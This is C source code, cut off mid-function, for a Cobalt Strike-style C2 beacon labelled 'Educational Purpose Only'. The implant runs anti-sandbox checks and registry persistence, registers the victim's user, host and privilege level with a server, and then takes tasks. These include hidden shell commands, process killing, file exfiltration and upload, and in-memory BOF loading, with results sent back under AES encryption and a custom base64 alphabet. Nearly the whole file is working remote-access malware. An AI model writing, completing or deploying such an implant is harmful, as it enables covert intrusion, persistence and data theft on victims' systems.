/*
 * Cobalt Strike Style Beacon (AES Edition) - CoffeeLdr Integration
 * Educational Purpose Only
 */

#ifdef _WIN32
    #include <windows.h>
    #include <wininet.h>
    #include <tlhelp32.h>
    #include <bcrypt.h>
#else
    // Linux compatibility headers
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <time.h>
    
    // Windows definitions for Linux context
    typedef unsigned long DWORD;
    typedef unsigned short WORD;
    typedef unsigned char BYTE;
    typedef long long LONGLONG;
    typedef int BOOL;
    typedef void* HANDLE;
    #define MAX_PATH 260
    #define FALSE 0
    #define TRUE 1
    #define INVALID_HANDLE_VALUE ((HANDLE)-1)
    #define INTERNET_DEFAULT_HTTP_PORT 80
    #define INTERNET_DEFAULT_HTTPS_PORT 443
    #define INTERNET_OPEN_TYPE_DIRECT 1
    #define INTERNET_FLAG_RELOAD 0x80000000
    #define INTERNET_FLAG_NO_CACHE_WRITE 0x40000000
    #define INTERNET_FLAG_SECURE 0x800000
    #define INTERNET_FLAG_IGNORE_CERT_CN_INVALID 0x1000
    #define INTERNET_FLAG_IGNORE_CERT_DATE_INVALID 0x1000
    typedef void* HINTERNET;
#endif

#include <stdio.h>
#include <stdbool.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>

// [关键修改] 引入新的 Loader 头文件
#include "CoffeeLdr.h"
#include "BeaconApi.h"
#include "Evasion.h"
#pragma warning(disable:4996)
#pragma comment(lib, "WinInet.lib")
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "User32.lib")

// --- 调试开关 ---
#define DEBUG_BEACON 1
#if DEBUG_BEACON
    #define DBG_PRINT(...) printf("[DEBUG] " __VA_ARGS__); printf("\n")
#else
    #define DBG_PRINT(...)
#endif

#define SERVER_URL "http://127.0.0.1"
#define SERVER_IP "127.0.0.1"
#define DEFAULT_SLEEP 10
#define DEFAULT_JITTER 0
#define BUFFER_SIZE 8192*1000
#define CHUNK_SIZE (1024 * 1024)

static const char CUSTOM_B64[] = "3GHIJKLMNOPQRSTUb4Fcd0fghijklmnopq/rstuvwxyzABCDEWXYZ12V56789a+e";
char g_uuid[128] = {0};
int g_sleepTime = DEFAULT_SLEEP;
int g_jitter = DEFAULT_JITTER;
bool g_registered = false;

// 函数声明
void beaconInit();
void beaconLoop();
char* httpRequest(const char* url, const char* method, const char* headers, const char* data, int dataLen);
void sendResult(const char* taskID, const char* result);
void sendChunkedResult(const char* taskID, const char* result, int totalLen);
char* execShell(const char* cmd);
void executeProgram(const char* cmdline, const char* taskID);
void getProcessList(char* output, int maxLen);
BOOL killProcess(DWORD pid);
void sleepWithJitter(int seconds);
char* escapeJsonString(const char* str);
void uploadFileToServer(const char* filepath, const char* taskID);
void downloadFileFromServer(const char* serverFile, const char* targetPath, const char* taskID);
void listDirectory(const char* path, char* output, int maxLen);
void listDrives(char* output, int maxLen);
void makeDirectory(const char* path, char* output, int maxLen);
char* customBase64Encode(const unsigned char* data, int len);
unsigned char* customBase64Decode(const char* data, int* outLen);
char* encryptDataAES(const char* data, int len, int* outLen);

// SHA256 Helper
void sha256(const char* input, int len, unsigned char* output) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) >= 0) {
        if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) >= 0) {
            BCryptHashData(hHash, (PUCHAR)input, len, 0);
            BCryptFinishHash(hHash, output, 32, 0);
            BCryptDestroyHash(hHash);
        }
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
}

// AES-GCM Encrypt
char* aesGcmEncrypt(const unsigned char* plaintext, int len, const unsigned char* key, int* outLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0);
    
    unsigned char nonce[12];
    for(int i=0; i<12; i++) nonce[i] = rand() % 256;
    
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    memset(&authInfo, 0, sizeof(authInfo));
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    unsigned char tag[16];
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = tag;
    authInfo.cbTag = 16;
    
    DWORD cipherLen = len;
    DWORD cbResult = 0;
    unsigned char* ciphertext = (unsigned char*)malloc(cipherLen);
    BCryptEncrypt(hKey, (PUCHAR)plaintext, len, &authInfo, NULL, 0, ciphertext, cipherLen, &cbResult, 0);
    
    *outLen = 12 + cipherLen + 16;
    char* finalBuf = (char*)malloc(*outLen);
    memcpy(finalBuf, nonce, 12);
    memcpy(finalBuf + 12, ciphertext, cipherLen);
    memcpy(finalBuf + 12 + cipherLen, tag, 16);
    
    free(ciphertext);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return finalBuf;
}

// Encrypt Helper
char* encryptDataAES(const char* data, int len, int* outLen) {
    if (!g_registered || strlen(g_uuid) == 0) {
        char* res = (char*)malloc(len + 1);
        memcpy(res, data, len);
        res[len] = '\0';
        *outLen = len;
        return res;
    }
    unsigned char key[32];
    sha256(g_uuid, strlen(g_uuid), key);
    int encLen;
    char* encrypted = aesGcmEncrypt((unsigned char*)data, len, key, &encLen);
    char* encoded = customBase64Encode((unsigned char*)encrypted, encLen);
    free(encrypted);
    *outLen = strlen(encoded);
    return encoded;
}

char* customBase64Encode(const unsigned char* data, int len) {
    int outLen = ((len + 2) / 3) * 4 + 1;
    char* out = (char*)malloc(outLen);
    if (!out) return NULL;
    int i, j = 0;
    for (i = 0; i < len; i += 3) {
        unsigned int val = (data[i] << 16);
        if (i + 1 < len) val |= (data[i + 1] << 8);
        if (i + 2 < len) val |= data[i + 2];
        out[j++] = CUSTOM_B64[(val >> 18) & 0x3F];
        out[j++] = CUSTOM_B64[(val >> 12) & 0x3F];
        out[j++] = (i + 1 < len) ? CUSTOM_B64[(val >> 6) & 0x3F] : '=';
        out[j++] = (i + 2 < len) ? CUSTOM_B64[val & 0x3F] : '=';
    }
    out[j] = '\0';
    return out;
}

unsigned char* customBase64Decode(const char* data, int* outLen) {
    int len = strlen(data);
    *outLen = (len * 3) / 4;
    unsigned char* out = (unsigned char*)malloc(*outLen + 1);
    if (!out) return NULL;
    unsigned char decodeTable[256];
    memset(decodeTable, 0xFF, 256);
    for (int i = 0; i < 64; i++) decodeTable[(unsigned char)CUSTOM_B64[i]] = i;
    int i, j = 0;
    for (i = 0; i < len; i += 4) {
        unsigned int val = 0;
        val |= (decodeTable[(unsigned char)data[i]] << 18);
        val |= (decodeTable[(unsigned char)data[i + 1]] << 12);
        if (data[i + 2] != '=') val |= (decodeTable[(unsigned char)data[i + 2]] << 6);
        if (data[i + 3] != '=') val |= decodeTable[(unsigned char)data[i + 3]];
        out[j++] = (val >> 16) & 0xFF;
        if (data[i + 2] != '=') out[j++] = (val >> 8) & 0xFF;
        if (data[i + 3] != '=') out[j++] = val & 0xFF;
    }
    *outLen = j;
    out[j] = '\0';
    return out;
}
int main() {
    Evasion_RunAntiSandboxChecks();
    Persistence_EnableRunKey();
    beaconInit();
    beaconLoop();
    return 0;
}
BOOL IsHighPrivilege() {
    HANDLE hToken;
    TOKEN_ELEVATION elevation;
    DWORD cbSize = sizeof(TOKEN_ELEVATION);
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
            CloseHandle(hToken);
            return elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return FALSE;
}

void beaconInit() {
    srand((unsigned int)time(NULL));
    char username[256] = {0}; char computername[256] = {0}; char internalIP[64] = {0}; char processName[MAX_PATH] = {0};
    DWORD size = 256;
    GetUserNameA(username, &size); size = 256; GetComputerNameA(computername, &size);
    char hostname[256]; gethostname(hostname, sizeof(hostname));
    struct hostent* host = gethostbyname(hostname);
    if (host && host->h_addr_list[0]) {
        struct in_addr addr; memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
        strcpy(internalIP, inet_ntoa(addr));
    } else strcpy(internalIP, "127.0.0.1");
    GetModuleFileNameA(NULL, processName, MAX_PATH);
    char* name = strrchr(processName, '\\'); if (name) name++; else name = processName;
    BOOL isAdmin = IsHighPrivilege();
    SYSTEM_INFO si; GetSystemInfo(&si);
    const char* arch = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86";
    
    char jsonData[4096];
    sprintf(jsonData, "{\"username\":\"%s\",\"computer\":\"%s\",\"internal_ip\":\"%s\",\"process\":\"%s\",\"pid\":%d,\"arch\":\"%s\",\"is_admin\":%s}",
        username, computername, internalIP, name, GetCurrentProcessId(), arch, isAdmin ? "true" : "false");
    DBG_PRINT("isAdmin: %s", isAdmin ? "true" : "false");
    DBG_PRINT("Registering with: %s", jsonData);
    char headers[] = "Content-Type: application/json\r\n";
    char* response = httpRequest(SERVER_URL "/beacon/register", "POST", headers, jsonData, strlen(jsonData));
    if (response && strlen(response) > 0) {
        char* uuidStart = strstr(response, "\"uuid\":\"");
        if (uuidStart) {
            uuidStart += 8; char* uuidEnd = strchr(uuidStart, '"');
            if (uuidEnd) {
                int len = uuidEnd - uuidStart;
                if (len < sizeof(g_uuid)) {
                    strncpy(g_uuid, uuidStart, len); g_uuid[len] = '\0'; g_registered = true;
                    DBG_PRINT("Registered UUID: %s", g_uuid);
                }
            }
        }
    } else {
        DBG_PRINT("Registration failed");
    }
    if (response) free(response);
}

void beaconLoop() {
    if (!g_registered) return;
    
    while (1) {
        char url[512]; sprintf(url, "%s/api/id?uuid=%s", SERVER_URL, g_uuid);
        char* response = httpRequest(url, "GET", NULL, NULL, 0);
        if (response && strlen(response) > 0) {
            char taskID[128] = {0}; char command[256] = {0}; 
            char *args = NULL; 
            
            char* taskStart = strstr(response, "\"task_id\":\"");
            if (taskStart) {
                taskStart += 11; char* taskEnd = strchr(taskStart, '"');
                if (taskEnd) { int len = taskEnd - taskStart; if (len < sizeof(taskID)) { strncpy(taskID, taskStart, len); taskID[len] = '\0'; } }
            }
            char* cmdStart = strstr(response, "\"command\":\"");
            if (cmdStart) {
                cmdStart += 11; char* cmdEnd = strchr(cmdStart, '"');
                if (cmdEnd) { int len = cmdEnd - cmdStart; if (len < sizeof(command)) { strncpy(command, cmdStart, len); command[len] = '\0'; } }
            }
            char* argsStart = strstr(response, "\"args\":\"");
            if (argsStart) {
                argsStart += 8; char* argsEnd = strchr(argsStart, '"');
                if (argsEnd) {
                    int len = argsEnd - argsStart;
                    args = (char*)malloc(len + 1);
                    if (args) { strncpy(args, argsStart, len); args[len] = '\0'; }
                }
            }
            
            if (strlen(command) > 0 && strlen(taskID) > 0) {
                DBG_PRINT("Received Command: %s (TaskID: %s)", command, taskID);
                
                if (strcmp(command, "help") == 0) sendResult(taskID, "Available: shell, ps, ls, upload, download, sleep, exit, help, bof");
                else if (strcmp(command, "shell") == 0) { char* result = execShell(args); sendResult(taskID, result); free(result); }
                else if (strcmp(command, "ps") == 0) { char* result = (char*)malloc(65536); getProcessList(result, 65536); sendResult(taskID, result); free(result); }
                else if (strcmp(command, "ls") == 0 || strcmp(command, "dir") == 0) { char* result = (char*)malloc(65536); const char* path = (args && args[0] != '\0') ? args : "."; listDirectory(path, result, 65536); sendResult(taskID, result); free(result); }
                else if (strcmp(command, "drives") == 0) { char* result = (char*)malloc(4096); listDrives(result, 4096); sendResult(taskID, result); free(result); }
                else if (strcmp(command, "mkdir") == 0) { char* result = (char*)malloc(512); makeDirectory(args, result, 512); sendResult(taskID, result); free(result); }
                else if (strcmp(command, "pwd") == 0) { char currentDir[MAX_PATH]; GetCurrentDirectoryA(MAX_PATH, currentDir); char result[MAX_PATH + 50]; sprintf(result, "[+] Current Directory: %s", currentDir); sendResult(taskID, result); }
                else if (strcmp(command, "cd") == 0) {
                    if (!args || args[0] == '\0') { char currentDir[MAX_PATH]; GetCurrentDirectoryA(MAX_PATH, currentDir); char result[MAX_PATH + 50]; sprintf(result, "[+] Current Directory: %s", currentDir); sendResult(taskID, result); }
                    else {
                        if (SetCurrentDirectoryA(args)) { char newDir[MAX_PATH]; GetCurrentDirectoryA(MAX_PATH, newDir); char result[MAX_PATH + 50]; sprintf(result, "[+] Changed to: %s", newDir); sendResult(taskID, result); }
                        else { char result[MAX_PATH + 100]; sprintf(result, "[-] Failed to change directory to: %s", args); sendResult(taskID, result); }
                    }
                }
                else if (strcmp(command, "download") == 0) uploadFileToServer(args, taskID);
                else if (strcmp(command, "upload") == 0) {
                    char* colon = strchr(args, ':');
                    if (colon) { *colon = '\0'; char* serverFile = args; char* targetPath = colon + 1; downloadFileFromServer(serverFile, targetPath, taskID); }
                    else sendResult(taskID, "[-] Usage: upload <server_filename>:<target_path>");
                }
                else if (strcmp(command, "rm") == 0 || strcmp(command, "del") == 0) { char result[512]; if (DeleteFileA(args)) sprintf(result, "[+] File deleted: %s", args); else sprintf(result, "[-] Failed to delete file: %s", args); sendResult(taskID, result); }
                else if (strcmp(command, "kill") == 0) { DWORD pid = atoi(args); char result[256]; if (killProcess(pid)) sprintf(result, "[+] Process %d killed", pid); else sprintf(result, "[-] Failed to kill process %d", pid); sendResult(taskID, result); }
                else if (strcmp(command, "sleep") == 0) {
                    int newSleep = 0, newJitter = 0; char* spacePos = strchr(args, ' ');
                    if (spacePos) { *spacePos = '\0'; newSleep = atoi(args); newJitter = atoi(spacePos + 1); g_sleepTime = newSleep; g_jitter = newJitter; char result[128]; sprintf(result, "[+] Sleep set to %d seconds, Jitter %d%%", g_sleepTime, g_jitter); sendResult(taskID, result); }
                    else { newSleep = atoi(args); g_sleepTime = newSleep; char result[128]; sprintf(result, "[+] Sleep set to %d seconds", g_sleepTime); sendResult(taskID, result); }
                }
                else if (strcmp(command, "execute") == 0 || strcmp(command, "exec") == 0) executeProgram(args, taskID);
                
                else if (strcmp(command, "bof") == 0) {
                    DBG_PRINT("Executing BOF command...");
                    char* colon = strchr(args, ':');
                    if (colon) {
                        *colon = 0;
                        char* bofEncoded = args;
                        char* argsEncoded = colon + 1;
                        int bofLen, argsLen;
                        
                        DBG_PRINT("=== BOF DEBUG START ===");
                        DBG_PRINT("bofEncoded Length: %d", (int)strlen(bofEncoded));
                        DBG_PRINT("=== BOF DEBUG END ===");
                        DBG_PRINT("=== BOF Arg DEBUG START ===");
                        DBG_PRINT("argsEncoded Length: %d", (int)strlen(argsEncoded));
                        DBG_PRINT("=== BOF Arg DEBUG END ===");    
                        DBG_PRINT("Decoding BOF data...");
                        unsigned char* bofData = customBase64Decode(bofEncoded, &bofLen);
                        unsigned char* argsData = customBase64Decode(argsEncoded, &argsLen);
                        
                        if (bofData) {
                            
                            CoffeeLdr("go", bofData, argsData, argsLen);
                            
                            int outSize = 0;
                            char* outputData = BeaconGetOutputData(&outSize);
                            
                            if (outputData && outSize > 0) {
                                DBG_PRINT("Got output data (%d bytes). Sending...", outSize);
                                sendResult(taskID, outputData);
                                free(outputData); 
                            } else {
                                DBG_PRINT("No output data received from BOF.");
                                sendResult(taskID, "[+] BOF Executed (No Output)");
                            }
                            free(bofData);
                        } else {
                            DBG_PRINT("BOF Decode Failed");
                            sendResult(taskID, "[-] BOF Decode Failed");
                        }
                        if (argsData) free(argsData);
                    } else {
                        sendResult(taskID, "[-] Usage: bof <encoded_bof>:<encoded_args>");
                    }
                }
                else if (strcmp(command, "exit") == 0) { sendResult(taskID, "OK"); if(args) free(args); return; }
                else { sendResult(taskID, "ERR_UNKNOWN_CMD"); }
            }
            if(args) free(args); 
        }
        
        if (response) free(response);
        sleepWithJitter(g_sleepTime);
    }
}

// HTTP Request
char* httpRequest(const char* url, const char* method, const char* customHeaders, const char* data, int dataLen) {
    if (!url || !method) return NULL;
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return NULL;
    char hostname[256] = {0}; char path[512] = {0}; int port = INTERNET_DEFAULT_HTTP_PORT;
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
#ifdef USE_SSL
    port = INTERNET_DEFAULT_HTTPS_PORT;
    flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
#endif
    const char* hostStart = strstr(url, "://");
    if (hostStart) {
        hostStart += 3; const char* pathStart = strchr(hostStart, '/'); const char* colon = strchr(hostStart, ':');
        if (pathStart) {
            int hostLen = (colon && colon < pathStart) ? (colon - hostStart) : (pathStart - hostStart);
            strncpy(hostname, hostStart, hostLen); strcpy(path, pathStart);
            if (colon && colon < pathStart) port = atoi(colon + 1);
        } else { strcpy(hostname, hostStart); strcpy(path, "/"); }
    }
    HINTERNET hConnect = InternetConnectA(hInternet, hostname, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return NULL; }
    HINTERNET hRequest = HttpOpenRequestA(hConnect, method, path, NULL, NULL, NULL, flags, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return NULL; }
#ifdef USE_SSL
    DWORD dwFlags; DWORD dwBuffLen = sizeof(dwFlags);
    if (InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlags, &dwBuffLen)) {
        dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }
#endif
    if (data && dataLen > 0) HttpSendRequestA(hRequest, customHeaders, customHeaders ? strlen(customHeaders) : 0, (LPVOID)data, dataLen);
    else HttpSendRequestA(hRequest, customHeaders, customHeaders ? strlen(customHeaders) : 0, NULL, 0);
    char* response = (char*)malloc(BUFFER_SIZE);
    if (!response) { InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return NULL; }
    DWORD bytesRead = 0, totalBytes = 0;
    while (InternetReadFile(hRequest, response + totalBytes, BUFFER_SIZE - totalBytes - 1, &bytesRead) && bytesRead > 0) {
        totalBytes += bytesRead;
        if (totalBytes >= BUFFER_SIZE - 1) {
            char* newResponse = (char*)realloc(response, totalBytes + BUFFER_SIZE);
            if (!newResponse) { free(response); InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return NULL; }
            response = newResponse;
        }
    }
    response[totalBytes] = '\0';
    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet);
    return response;
}

// JSON Escape
char* escapeJsonString(const char* str) {
    int len = strlen(str); char* escaped = (char*)malloc(len * 2 + 1); int j = 0;
    for (int i = 0; i < len; i++) {
        if (str[i] == '"' || str[i] == '\\') { escaped[j++] = '\\'; }
        if (str[i] == '\n') { escaped[j++] = '\\'; escaped[j++] = 'n'; continue; }
        if (str[i] == '\r') { escaped[j++] = '\\'; escaped[j++] = 'r'; continue; }
        if (str[i] == '\t') { escaped[j++] = '\\'; escaped[j++] = 't'; continue; }
        escaped[j++] = str[i];
    }
    escaped[j] = '\0'; return escaped;
}

// Send Result
void sendResult(const char* taskID, const char* result) {
    if (!result || !taskID) return;
    int resultLen = strlen(result);
    if (resultLen > CHUNK_SIZE) { sendChunkedResult(taskID, result, resultLen); return; }
    char* escapedResult = escapeJsonString(result);
    char* jsonData = (char*)malloc(strlen(escapedResult) + 1024);
    sprintf(jsonData, "{\"task_id\":\"%s\",\"result\":\"%s\"}", taskID, escapedResult);
    free(escapedResult);
    int encLen; char* encrypted = encryptDataAES(jsonData, strlen(jsonData), &encLen); free(jsonData);
    char url[512]; sprintf(url, "%s/api/id?uuid=%s", SERVER_URL, g_uuid);
    char headers[] = "Content-Type: application/octet-stream\r\n";
    char* response = httpRequest(url, "POST", headers, encrypted, encLen);
    free(encrypted); if (response) free(response);
}

// Chunked Result
void sendChunkedResult(const char* taskID, const char* result, int totalLen) {
    int chunks = (totalLen + CHUNK_SIZE - 1) / CHUNK_SIZE;
    for (int i = 0; i < chunks; i++) {
        int offset = i * CHUNK_SIZE;
        int chunkLen = (offset + CHUNK_SIZE > totalLen) ? (totalLen - offset) : CHUNK_SIZE;
        char* chunk = (char*)malloc(chunkLen + 1); memcpy(chunk, result + offset, chunkLen); chunk[chunkLen] = '\0';
        char* escapedChunk = escapeJsonString(chunk);
        char* jsonData = (char*)malloc(strlen(escapedChunk) + 512);
        if (chunks > 1) sprintf(jsonData, "{\"task_id\":\"%s\",\"result\":\"%s\",\"chunk\":%d,\"total_chunks\":%d,\"chunked\":true}", taskID, escapedChunk, i + 1, chunks);
        else sprintf(jsonData, "{\"task_id\":\"%s\",\"result\":\"%s\"}", taskID, escapedChunk);
        free(chunk); free(escapedChunk);
        int encLen; char* encrypted = encryptDataAES(jsonData, strlen(jsonData), &encLen); free(jsonData);
        char url[512]; sprintf(url, "%s/api/id?uuid=%s", SERVER_URL, g_uuid);
        char headers[] = "Content-Type: application/octet-stream\r\n";
        char* response = httpRequest(url, "POST", headers, encrypted, encLen);
        free(encrypted); if (response) free(response); Sleep(100);
    }
}

// Exec Shell
char* execShell(const char* cmd) {
    HANDLE hReadPipe, hWritePipe; SECURITY_ATTRIBUTES sa; STARTUPINFOA si; PROCESS_INFORMATION pi;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.bInheritHandle = TRUE; sa.lpSecurityDescriptor = NULL;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return _strdup("[-] Pipe Error");
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si); si.hStdError = hWritePipe; si.hStdOutput = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    char fullCmd[4096]; sprintf(fullCmd, "/c %s", cmd);
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", fullCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWritePipe); CloseHandle(hReadPipe); return _strdup("ERR_CREATEPROCESS");
    }
    CloseHandle(hWritePipe);
    DWORD bufferSize = 1024 * 1024; char* output = (char*)malloc(bufferSize);
    if (!output) { CloseHandle(hReadPipe); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return _strdup("ERR_MALLOC"); }
    DWORD totalRead = 0; DWORD bytesRead; char buffer[4096];
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        if (totalRead + bytesRead >= bufferSize - 1) {
            bufferSize *= 2; char* newOutput = (char*)realloc(output, bufferSize);
            if (!newOutput) { free(output); CloseHandle(hReadPipe); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return _strdup("ERR_REALLOC"); }
            output = newOutput;
        }
        memcpy(output + totalRead, buffer, bytesRead); totalRead += bytesRead;
    }
    output[totalRead] = '\0';
    WaitForSingleObject(pi.hProcess, INFINITE); CloseHandle(hReadPipe); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    if (totalRead == 0) { free(output); return _strdup("OK"); }
    return output;
}

// Exec Program
void executeProgram(const char* cmdline, const char* taskID) {
    if (!cmdline || cmdline[0] == '\0') { sendResult(taskID, "ERR_NO_ARGS"); return; }
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    char* cmdlineCopy = _strdup(cmdline); ZeroMemory(&pi, sizeof(pi));
    if (CreateProcessA(NULL, cmdlineCopy, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
        char result[32]; sprintf(result, "%d", pi.dwProcessId); sendResult(taskID, result);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    } else {
        char result[16]; sprintf(result, "ERR_%d", GetLastError()); sendResult(taskID, result);
    }
    free(cmdlineCopy);
}

// Get Process List
void getProcessList(char* output, int maxLen) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) { strcpy(output, "[-] Snapshot Failed"); return; }
    PROCESSENTRY32W pe32; pe32.dwSize = sizeof(PROCESSENTRY32W);
    int offset = 0; offset += sprintf(output + offset, "PPID\tPID\tName\tPath\n====\t====\t====\t====\n");
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (offset + 1024 >= maxLen) break;
            char procName[MAX_PATH]; WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, procName, MAX_PATH, NULL, NULL);
            char fullPath[MAX_PATH] = {0}; strcpy(fullPath, procName);
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                WCHAR wPath[MAX_PATH]; DWORD pathLen = MAX_PATH;
                if (QueryFullProcessImageNameW(hProcess, 0, wPath, &pathLen)) {
                    WideCharToMultiByte(CP_UTF8, 0, wPath, -1, fullPath, MAX_PATH, NULL, NULL);
                }
                CloseHandle(hProcess);
            }
            offset += sprintf(output + offset, "%lu\t%lu\t%s\t%s\n", pe32.th32ParentProcessID, pe32.th32ProcessID, procName, fullPath);
        } while (Process32NextW(hSnapshot, &pe32));
    }
    output[offset] = '\0'; CloseHandle(hSnapshot);
}

// Kill Process
BOOL killProcess(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) return FALSE;
    BOOL result = TerminateProcess(hProcess, 0); CloseHandle(hProcess); return result;
}

// Sleep
void sleepWithJitter(int seconds) {
    if (g_jitter > 0) {
        int jitterMs = (seconds * 1000 * g_jitter) / 100;
        int randomJitter = (rand() % (jitterMs * 2 + 1)) - jitterMs;
        int totalMs = (seconds * 1000) + randomJitter;
        if (totalMs < 1000) totalMs = 1000;
        Sleep(totalMs);
    } else { Sleep(seconds * 1000); }
}

// Upload
void uploadFileToServer(const char* filepath, const char* taskID) {
    FILE* file = fopen(filepath, "rb");
    if (!file) { sendResult(taskID, "ERR_FILE_NOT_FOUND"); return; }
    fseek(file, 0, SEEK_END); long filesize = ftell(file); fseek(file, 0, SEEK_SET);
    char* filename = strrchr(filepath, '\\'); if (!filename) filename = strrchr(filepath, '/'); if (!filename) filename = (char*)filepath; else filename++;
    const int CHUNK_SIZE_FILE = 512 * 1024; int totalChunks = (filesize + CHUNK_SIZE_FILE - 1) / CHUNK_SIZE_FILE;
    char url[512]; sprintf(url, "%s/api/id?uuid=%s", SERVER_URL, g_uuid);
    char headers[] = "Content-Type: application/json\r\n";
    for (int chunkNum = 1; chunkNum <= totalChunks; chunkNum++) {
        long offset = (chunkNum - 1) * CHUNK_SIZE_FILE;
        long chunkSize = (offset + CHUNK_SIZE_FILE > filesize) ? (filesize - offset) : CHUNK_SIZE_FILE;
        unsigned char* chunkData = (unsigned char*)malloc(chunkSize); fread(chunkData, 1, chunkSize, file);
        char* encodedData = customBase64Encode(chunkData, chunkSize); free(chunkData);
        char* jsonData = (char*)malloc(strlen(filename) + strlen(encodedData) + 512);
        if (totalChunks > 1) sprintf(jsonData, "{\"task_id\":\"%s\",\"filename\":\"%s\",\"data\":\"%s\",\"size\":%ld,\"chunk\":%d,\"total_chunks\":%d,\"file_transfer\":true}", taskID, filename, encodedData, filesize, chunkNum, totalChunks);
        else sprintf(jsonData, "{\"task_id\":\"%s\",\"filename\":\"%s\",\"data\":\"%s\",\"size\":%ld,\"file_transfer\":true}", taskID, filename, encodedData, filesize);
        free(encodedData);
        int encLen; char* encrypted = encryptDataAES(jsonData, strlen(jsonData), &encLen); free(jsonData);
        char headersOctet[] = "Content-Type: application/octet-stream\r\n";
        char* response = httpRequest(url, "POST", headersOctet, encrypted, encLen);
        free(encrypted); if (response) free(response); if (chunkNum < totalChunks) Sleep(100);
    }
    fclose(file); char result[64]; sprintf(result, "%ld", filesize); sendResult(taskID, result);
}

// Download Placeholder
// [修复] 真正的文件下载函数 (支持二进制)
void downloadFileFromServer(const char* serverFile, const char* targetPath, const char* taskID) {
    DBG_PRINT("Starting download: %s -> %s", serverFile, targetPath);

    // 1. 打开本地文件准备写入
    FILE* fp = fopen(targetPath, "wb");
    if (!fp) {
        char err[256];
        sprintf(err, "[-] Failed to open local file: %s", targetPath);
        sendResult(taskID, err);
        return;
    }

    // 2. 初始化 WinInet
